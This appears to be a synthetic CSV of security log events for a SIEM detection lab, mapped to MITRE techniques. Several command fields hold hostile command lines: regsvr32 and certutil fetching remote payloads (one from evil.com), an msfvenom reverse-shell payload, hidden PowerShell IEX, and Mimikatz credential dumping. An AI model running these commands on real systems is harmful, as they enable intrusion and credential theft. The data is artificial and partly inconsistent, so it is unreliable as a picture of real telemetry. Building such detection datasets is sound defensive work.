access_type,action,action_taken,agent_ip,agent_name,attachment,attacker_host,attempt_count,bytes_sent,bytes_transferred,cloud_provider,command,command_line,destination_domain,destination_host,destination_ip,destination_port,dns_query,encryption_type,event_code,event_type,failure_reason,file_hash,file_path,files_affected,host,image,indicator,injection_type,lab_attack,lab_note,log_source,login_location_1,login_location_2,logon_type,malware_name,mitre_technique,parent_process,ports_scanned,privileges_assigned,process,process_id,protocol,query_count,query_type,recipient,registry_key,resource,rule_name,scan_type,sender,service_name,severity,signature,signature_id,signed,source_host,source_ip,source_process,subject,target_ip,target_process,time_difference_minutes,timestamp,tool,user,value,wazuh_rule_desc,wazuh_rule_id
,,,,,,,,,,,,,,SPLUNK-VM-01,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,KALI-LAB-01,192.168.56.102,,,,,,2026-04-23T22:38:37.665544,,john.doe,,,
,,,,,,,,,,,powershell -c (New-Object Net.WebClient).DownloadFile,,,,,,,,4104,PowerShell Execution,,,,,KALI-LAB-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T07:47:37.664760,,jane.smith,,,
,,,,,,,,,,,,,,,,,YmFzZTY0.cobalt-beacon[.]onion,,,DNS Tunneling Detected,,,,,WIN-PRAHARSH-01,,,,,,DNS / Zeek,,,,,T1071.004,,,,,,,238,TXT,,,,,,,,Critical,,,,,,,,,,,2026-04-23T19:02:37.666595,,,,,
,BLOCK,,,,,,,,,,,,,,10.0.2.10,23,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,TCP,,,,,,Block-Kali-Attacker,,,,Low,,,,,185.220.101.45,,,,,,2026-04-22T13:11:37.668523,,,,,
,,,10.0.2.15,DEV-SERVER-01,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-21T10:19:37.669495,,,,Multiple failed SSH logins,5710
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,WAZUH-MANAGER-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,185.220.101.45,,,,,,2026-04-21T15:56:37.659683,,praharsh.admin,,,
,BLOCK,,,,,,,,,,,,,,192.168.56.103,23,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-RDP,,,,Low,,,,,91.234.56.78,,,,,,2026-04-22T21:06:37.668388,,,,,
,,,,,,,,,,,powershell -c (New-Object Net.WebClient).DownloadFile,,,,,,,,4104,PowerShell Execution,,,,,WAZUH-MANAGER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T14:46:37.664589,,attacker,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,DEV-SERVER-01,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,10.0.2.10,,,,,,2026-04-21T21:59:37.661274,,john.doe,,,
,,,192.168.56.103,WAZUH-MANAGER-01,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-19T16:53:37.669331,,,,Suspicious process spawned,5712
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,KALI-LAB-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,10.0.2.15,,,,,,2026-04-22T17:37:37.659714,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,ELK-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,103.45.78.21,,,,,,2026-04-23T18:46:37.659730,,finance.user,,,
,,,,,,,,,,,,,,,,,,0x17,4769,Kerberos TGS Request,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,,,T1558.003,,,,,,,,,,,,,,,svc.backup,High,,,,,,,,,,,2026-04-23T15:26:37.662715,,john.doe,,,
,,,,,,,,,,,,,,,,,aGVsbG8.data-exfil[.]io,,,DNS Tunneling Detected,,,,,WIN-PRAHARSH-01,,,,,,DNS / Zeek,,,,,T1071.004,,,,,,,241,TXT,,,,,,,,Critical,,,,,,,,,,,2026-04-19T22:34:37.666701,,,,,
,,Cleaned,,,,,,,,,,,,,,,,,,Malware Detected,,deadbeef12345678cafebabe87654321,C:\Users\Public\malware.exe,,WIN-DC-PRAHARSH,,,,,,Windows Defender / Wazuh,,,,RedLineStealer,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-24T11:37:37.667384,,,,,
,AttachAdminPolicy,,,,,,,,,AWS,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,ec2:sg-12345,,,,,High,,,,,,,,,,,2026-04-23T08:53:37.667903,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Bad Password,,,,WIN-DC-PRAHARSH,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.101,,,,,,2026-04-23T20:59:37.660342,,dev.engineer,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,WAZUH-MANAGER-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,172.16.0.100,,,,,,2026-04-24T04:25:37.659581,,dev.engineer,,,
,,,,,,,,,,,powershell Invoke-Mimikatz,,,,,,,,4104,PowerShell Execution,,,,,WAZUH-MANAGER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T18:52:37.664607,,finance.user,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WIN-PRAHARSH-01,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,172.16.0.100,,,,,,2026-04-20T15:18:37.661297,,john.doe,,,
,,,,,,,,,,,powershell Invoke-Mimikatz,,,,,,,,4104,PowerShell Execution,,,,,FIN-SERVER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T19:04:37.664611,,temp.analyst,,,
,,,,,,,,,,,,regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll,,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,regsvr32.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-19T19:48:37.664900,,praharsh.admin,,,
,,,,,,,,1208092,,,,,evil-c2[.]com,,194.165.16.11,8443,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-23T10:00:37.666287,,,,,
,,,,,,,,,,,,,,,77.73.133.84,443,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,msiexec.exe,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-21T07:11:37.663643,,jane.smith,,,
,,,,,,KALI-LAB-01,413,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T03:04:37.661594,Hydra,lab.administrator,,,
,,,,,,,,,,,,wmic /node:TARGET process call create cmd.exe,,WIN-PRAHARSH-01,,,,,1,WMI Remote Execution,,,,,,,,,,,Sysmon,,,,,T1047,,,,wmiprvse.exe,,,,,,,,,,,,High,,,,SPLUNK-VM-01,,,,,,,2026-04-24T03:51:37.666024,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,ELK-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-23T16:49:37.660414,,temp.analyst,,,
,,,,,,,,,,,,,,,77.73.133.84,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,Critical,ET MALWARE CobaltStrike Beacon,2728779,,,192.168.56.104,,,,,,2026-04-19T15:08:37.668917,,,,,
,,,,,,,,,,,,,,FIN-SERVER-01,,,,,7045,PsExec Detected,,,,,,,,,,,Sysmon,,,,,T1570,,,,,,,,,,,,,,,PSEXESVC,High,,,,WIN-PRAHARSH-01,,,,,,,2026-04-20T06:19:37.665763,,attacker,,,
,,,,,,KALI-LAB-01,317,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T04:57:37.661704,Hydra,lab.administrator,,,
,,,,,,KALI-LAB-01,313,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-24T05:38:37.661647,Hydra,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WAZUH-MANAGER-01,,,,,,Windows Security,,,3,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.101,,,,,,2026-04-21T14:24:37.660912,,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,KALI-LAB-01,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,10.0.2.15,,,,,,2026-04-20T23:22:37.661061,,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Bad Password,,,,KALI-LAB-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,77.73.133.84,,,,,,2026-04-22T02:49:37.660233,,temp.analyst,,,
,,,,,,,,,,,,,,,45.67.22.10,1337,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,certutil.exe,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-24T06:34:37.663688,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,WIN-PRAHARSH-01,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-24T10:10:37.660486,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,WAZUH-MANAGER-01,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,10.0.2.10,,,,,,2026-04-21T18:32:37.660057,,lab.administrator,,,
,,,,,,KALI-LAB-01,193,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T06:13:37.661392,Hydra,lab.administrator,,,
,BLOCK,,,,,,,,,,,,,,10.0.2.15,22,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,TCP,,,,,,Block-Kali-Attacker,,,,Low,,,,,185.220.101.45,,,,,,2026-04-20T04:44:37.668200,,,,,
,,,,,,,,,,,,certutil -urlcache -split -f http://192.168.56.104/mal.exe C:\Windows\Temp\mal.exe,,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,regsvr32.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-24T14:16:37.664965,,jane.smith,,,
,,,,,,,,,,,,,,,,,,,13,Sysmon Registry Set,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1547.001,,,,cmd.exe,,,,,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,,,,,,High,,,,,,,,,,,2026-04-22T10:58:37.664064,,,C:\Windows\Temp\backdoor.exe,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T05:43:37.663019,,jane.smith,,,
,,,,,,,,,,,powershell -c (New-Object Net.WebClient).DownloadFile,,,,,,,,4104,PowerShell Execution,,,,,SPLUNK-VM-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-21T07:30:37.664637,,svc.backup,,,
,,,,,,,,,,,,,,WIN-DC-PRAHARSH,,,,,7045,PsExec Detected,,,,,,,,,,,Sysmon,,,,,T1570,,,,,,,,,,,,,,,PSEXESVC,High,,,,WIN-PRAHARSH-01,,,,,,,2026-04-21T17:04:37.665867,,john.doe,,,
,,Blocked,,,,,,,,,,,,,,,,,,Malware Detected,,a1b2c3d4e5f6789012345678abcdef01,C:\Users\praharsh.admin\Downloads\invoice.exe,,SPLUNK-VM-01,,,,,,Windows Defender / Wazuh,,,,Ryuk.Ransomware,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T04:10:37.667504,,,,,
,BLOCK,,,,,,,,,,,,,,172.16.0.100,445,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,TCP,,,,,,Block-RDP,,,,Low,,,,,194.165.16.11,,,,,,2026-04-20T07:40:37.668696,,,,,
,,,,,,,373,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T16:57:37.662448,Hydra,root,,,
,,,,,,,,,,,,,,,91.234.56.78,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,Critical,ET SCAN Nmap Detected,2730190,,,10.0.2.10,,,,,,2026-04-20T10:13:37.668793,,,,,
,,,,,,,,,,,,,,,,,,,,Ransomware Activity,,,,28890,KALI-LAB-01,,Mass file encryption detected,,,,Sysmon / EDR,,,,,T1486,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T18:40:37.667724,,,,,
,,,,,,,,,,,,,,KALI-LAB-01,,,,,7045,PsExec Detected,,,,,,,,,,,Sysmon,,,,,T1570,,,,,,,,,,,,,,,PSEXESVC,High,,,,WIN-PRAHARSH-01,,,,,,,2026-04-21T04:25:37.665880,,svc.backup,,,
,,,,,,,,,,,,,,FIN-SERVER-01,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,WIN-DC-PRAHARSH,192.168.56.102,,,,,,2026-04-23T09:21:37.665577,,dev.engineer,,,
,,,,,,,,,,,,,,WAZUH-MANAGER-01,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,DEV-SERVER-01,192.168.56.103,,,,,,2026-04-23T06:32:37.665440,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,SPLUNK-VM-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,103.45.78.21,,,,,,2026-04-24T09:19:37.659849,,john.doe,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T16:56:37.662902,,john.doe,,,
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\Windows\Temp\payload.exe,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,wmic.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-20T06:12:37.663884,,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,KALI-LAB-01,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,77.73.133.84,,,,,,2026-04-23T01:01:37.660279,,john.doe,,,
0x1010,,,,,,,,,,,,,,,,,,,10,Credential Dumping,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon Event ID 10,,,,,T1003.001,,,,procdump.exe,,,,,,,,,,,,Critical,,,,,,,,,lsass.exe,,2026-04-23T00:53:37.667175,,lab.administrator,,,
,,,,,,,,,,,,,,KALI-LAB-01,,,,,7045,PsExec Detected,,,,,,,,,,,Sysmon,,,,,T1570,,,,,,,,,,,,,,,PSEXESVC,High,,,,WIN-PRAHARSH-01,,,,,,,2026-04-22T01:12:37.665766,,praharsh.admin,,,
,,Detected,,,,,,,,,,,,,,,,,,Malware Detected,,e10adc3949ba59abbe56e057f20f883e,C:\Windows\Temp\payload.dll,,WIN-DC-PRAHARSH,,,,,,Windows Defender / Wazuh,,,,Ryuk.Ransomware,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-24T10:37:37.667509,,,,,
,,,,,,,,,,,,mimikatz.exe lsadump::sam,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,procdump.exe,3643,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-22T02:36:37.663270,,praharsh.admin,,,
,,,,,,,,,,,,wmic /node:TARGET process call create cmd.exe,,WAZUH-MANAGER-01,,,,,1,WMI Remote Execution,,,,,,,,,,,Sysmon,,,,,T1047,,,,wmiprvse.exe,,,,,,,,,,,,High,,,,DEV-SERVER-01,,,,,,,2026-04-21T03:24:37.665927,,svc.backup,,,
,,,10.0.2.15,DEV-SERVER-01,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-21T20:06:37.669380,,,,Rootkit detection attempt,5712
,,,,,,,,,,,,,,WAZUH-MANAGER-01,,,,,7045,PsExec Detected,,,,,,,,,,,Sysmon,,,,,T1570,,,,,,,,,,,,,,,PSEXESVC,High,,,,WIN-PRAHARSH-01,,,,,,,2026-04-21T19:47:37.665888,,svc.backup,,,
,,,,,,KALI-LAB-01,67,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-21T21:59:37.661354,Hydra,lab.administrator,,,
,,,,,,,107,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T17:40:37.662354,Hydra / CrackMapExec,dev.engineer,,,
,,,,,,,381,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-19T18:29:37.662642,Hydra,splunk,,,
,,,,,,,,,,,,,,WIN-DC-PRAHARSH,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,ELK-SERVER-01,192.168.56.102,,,,,,2026-04-21T04:08:37.665690,,lab.administrator,,,
,,,,,,,,443857,,,,,evil-c2[.]com,,77.73.133.84,1337,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-20T11:33:37.666180,,,,,
,,,,,,,,,,,,,,,,,,,,Ransomware Activity,,,,35394,WIN-PRAHARSH-01,,Volume shadow service stopped,,,,Sysmon / EDR,,,,,T1486,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-22T10:29:37.667715,,,,,
,,,,,,,,,,,,,,,23.129.64.100,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,High,ET EXPLOIT CVE-2021-44228 Log4j,2059438,,,192.168.56.105,,,,,,2026-04-21T19:03:37.668892,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Bad Password,,,,ELK-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.101,,,,,,2026-04-19T20:15:37.659901,,dev.engineer,,,
,,,,,,,,7234774,,,,,evil-c2[.]com,,23.129.64.100,1337,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-19T21:02:37.666131,,,,,
,,,,,,,,,,,,,,,,,,,8,Process Injection,,,,,ELK-SERVER-01,,,APC Injection,,,Sysmon Event ID 8,,,,,T1055,,,,,,,,,,,,,,,,Critical,,,,,,regsvr32.exe,,,notepad.exe,,2026-04-21T06:14:37.667612,,,,,
,,,,,,,,,,,,,,,23.129.64.100,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,Critical,ET TROJAN Metasploit Meterpreter,2635185,,,192.168.56.102,,,,,,2026-04-20T03:51:37.668746,,,,,
,,Cleaned,,,,,,,,,,,,,,,,,,Malware Detected,,e10adc3949ba59abbe56e057f20f883e,C:\Windows\Temp\payload.dll,,KALI-LAB-01,,,,,,Windows Defender / Wazuh,,,,Mimikatz,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T16:26:37.667234,,,,,
,,,,,,,,,,,powershell Invoke-Mimikatz,,,,,,,,4104,PowerShell Execution,,,,,FIN-SERVER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T08:30:37.664726,,temp.analyst,,,
,,,,,,,,,,,powershell -nop -w hidden -c IEX,,,,,,,,4104,PowerShell Execution,,,,,DEV-SERVER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-21T06:42:37.664646,,praharsh.admin,,,
,,,,,,,,,,,,msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444,,,192.168.56.104,9001,,,1,Reverse Shell Detected,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1059.001,,,,,,,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-23T05:50:37.664329,Metasploit / Netcat,attacker,,,
,,,,,,,,867613,,,,,evil-c2[.]com,,45.67.22.10,443,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-22T00:50:37.666520,,,,,
,,,,,,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,jane.smith@praharsh-lab.local,,,,,it-helpdesk@micr0soft[.]com,,High,,,,,,,Invoice #12345 Attached,,,,2026-04-22T01:07:37.669211,,,,,
,AttachAdminPolicy,,,,,,,,,GCP,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,iam:user/temp.analyst,,,,,High,,,,,,,,,,,2026-04-21T20:26:37.667966,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,91.234.56.78,,,,,,2026-04-22T02:38:37.660142,,jane.smith,,,
,,,,,,,,,,,,,,,,,ZXhmaWw.mimikatz-payload[.]ru,,,DNS Tunneling Detected,,,,,WIN-PRAHARSH-01,,,,,,DNS / Zeek,,,,,T1071.004,,,,,,,340,TXT,,,,,,,,Critical,,,,,,,,,,,2026-04-23T21:31:37.666551,,,,,
,,,,,,,,,,,,,,,,,,0x17,4769,Kerberos TGS Request,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,,,T1558.003,,,,,,,,,,,,,,,svc.sql,High,,,,,,,,,,,2026-04-21T10:46:37.662827,,svc.splunk,,,
,,,,,,,,7323886,,,,,malware-drop[.]net,,23.129.64.100,4444,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-21T06:45:37.666351,,,,,
,,,,,,,,,,,,,,,,,,,,Port Scan Detected,,,,,,,,,True,,Firewall / IDS,,,,,T1046,,61022,,,,,,,,,,,Version Scan,,,Medium,,,,,192.168.56.104,,,192.168.56.105,,,2026-04-20T01:20:37.665189,Nmap,,,,
,,,192.168.56.101,WIN-DC-PRAHARSH,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-20T10:30:37.669337,,,,Privilege escalation detected,31101
,BLOCK,,,,,,,,,,,,,,172.16.0.100,22,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-SSH-External,,,,Low,,,,,192.168.56.104,,,,,,2026-04-21T21:08:37.668533,,,,,
,AssumeRole,,,,,,,,,AWS,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,iam:user/temp.analyst,,,,,High,,,,,,,,,,,2026-04-23T20:11:37.667962,,temp.analyst,,,
0x1010,,,,,,,,,,,,,,,,,,,10,Credential Dumping,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon Event ID 10,,,,,T1003.001,,,,comsvcs.dll,,,,,,,,,,,,Critical,,,,,,,,,lsass.exe,,2026-04-22T11:54:37.667205,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,4672,Privilege Escalation,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1068,,,SeBackupPrivilege,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T11:56:37.665257,,jane.smith,,,
,,,,,,,,,,,,,,,,,,,13,Sysmon Registry Set,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1547.001,,,,certutil.exe,,,,,,HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce,,,,,,High,,,,,,,,,,,2026-04-24T01:38:37.664166,,,C:\Windows\Temp\backdoor.exe,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-19T19:45:37.662871,,praharsh.admin,,,
,AssumeRole,,,,,,,,,GCP,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,ec2:sg-12345,,,,,High,,,,,,,,,,,2026-04-23T00:33:37.667953,,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Unknown User,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.102,,,,,,2026-04-20T11:37:37.660561,,attacker,,,
